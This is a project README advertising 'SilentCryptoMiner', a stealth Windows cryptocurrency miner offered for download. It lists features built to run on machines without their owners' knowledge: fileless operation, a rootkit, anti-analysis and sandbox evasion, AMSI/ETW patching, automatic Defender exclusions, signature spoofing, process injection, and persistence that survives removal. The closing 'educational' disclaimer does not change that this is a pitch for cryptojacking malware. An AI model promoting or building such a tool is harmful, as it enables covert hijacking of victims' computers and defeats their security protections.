# Hidden-XMR-Miner

**SilentCryptoMiner v4.0.0** is the most advanced free hidden (silent) miner for Windows.

A high-performance native miner with powerful hiding, anti-analysis, and persistence capabilities. Supports mining **XMR, ETC, RVN, RTM, Kaspa, Ergo, Firo, Zephyr** and many other coins.

---

### Supported algorithms

**CPU (RandomX, GhostRider, etc.):**
- `rx/0`, `rx/wow`, `rx/arq`, `rx/sfx`, `rx/graft`, `rx/yada`, `cn/`, `cn-heavy/`, `ghostrider`

**GPU (NVIDIA + AMD):**
- `kawpow`, `progpow`, `firopow`, `evrprogpow`, `progpowz`, `heavyhash` (Kaspa), `autolykos2` (Ergo), `ethash`, `etchash`, `ubqhash` and many others.

---

### Main Features (v4.0.0)

- **Completely rewritten in modern C++20**
- **Memory Only (Fileless)** — operation mode completely from memory (without writing the miner to disk)
- **Improved Rootkit** (based on HyperHide + proprietary improvements) — hides processes, files and registry as much as possible
- **Advanced Anti-Analysis** — anti-VM, anti-debugger, anti-sandbox, timing-based detection, hardware fingerprinting
- **ETW/AMSI/ETW Ti patching** — disabling Windows telemetry at a low level
- **Multi—level Stealth** - suspends mining, clears video memory and RAM when target programs are detected
- **Improved Watchdog** — Multiple persistence methods (Task Scheduler + Windows Service + Registry)
- **Idle Mining** with separate profiles for "in use/without user"
- **Process Killer** + **Process Protector**
- **Remote Configuration** (encrypted JSON) with failover URL support
- **Web Panel Support** — full monitoring and management via [UnimWebPanel](https://github.com/Unam3D/UnamWebPanel )
- **Signature Cloning** (digital signature spoofing)
- **Windows Defender Auto Exclusions**
- **Self-healing** and automatic recovery after removal
- **Significant reduction in**antivirus detection compared to 3.x

---

### Wiki & Documentation

Full documentation is available in **[Wiki](https://github.com/mrjonas101/Hidden-XMR-Miner/wiki )**.

---

### Web Panel

Official control panel: **[UnimWebPanel](https://github.com/Unam3D/UnamWebPanel )**

---

### Changelog

###4.0.0 (Major Update) — March 2024

- Complete core redesign in **C++20** using CMake
- Added **Memory Only (Fileless)** Miner mode can work without a single file on the disk
- New significantly more stable and stealthy **rootkit** (HyperHide + custom patches)
- Implemented **ETW/AMSI patching** and disabling Windows Telemetry at the kernel level
- Added an advanced **Anti-Analysis** system (virtual machines, debuggers, sandbox evasion, hardware fingerprinting)
- Added support for **Kaspa (kHeavyHash)**
- Completely rewritten GPU backend — improved stability and performance on new drivers
- Watchdog now supports running as a **Windows Service**
- Remote Configuration now uses **encrypted** format and supports multiple URLs (failover)
- Significantly reduced the probability of detection by antiviruses (new obfuscation techniques, compilation, string literals)
- Added a "Self Destruct" mechanism
- Improved GPU memory cleanup when entering Stealth mode
- Redesigned and optimized the injector (new APC + EarlyBird + Process Hollowing techniques)
- Numerous performance optimizations and binary size reduction
- Complete redesign of builder (improved interface and logic)
- Lots of bugfixes and internal improvements

**3.3.1** (04/09/2023) — the latest release of the 3.x branch (see below for a complete list of changes from previous versions).

> **The full changelog of previous versions** can be viewed [here](https://github.com/mrjonas101/Hidden-XMR-Miner/blob/main/CHANGELOG.md ).

---

### Authors and translators

- **Author**: [Unam Sanctam](https://github.com/Unam3D )
- **Contributors**:
- Werlrlivx — Polish Translation
  - Xeneht — Spanish Translation
  - BITIW — Russian Translation
  - MatheusOliveira-dev — Portuguese (Brazil) Translation

---

### Disclaimer

I, the creator, ** do not accept any responsibility** for any use of this software.  
You are fully responsible for your actions. This software has been created **solely for educational purposes**.

**It is forbidden** to use this miner on devices that you do not own or do not have explicit permission to use.

By using this Software, you automatically agree to the above.

---

### License

This project is distributed under the **MIT License** — see the [LICENSE](LICENSE) file for details.

---
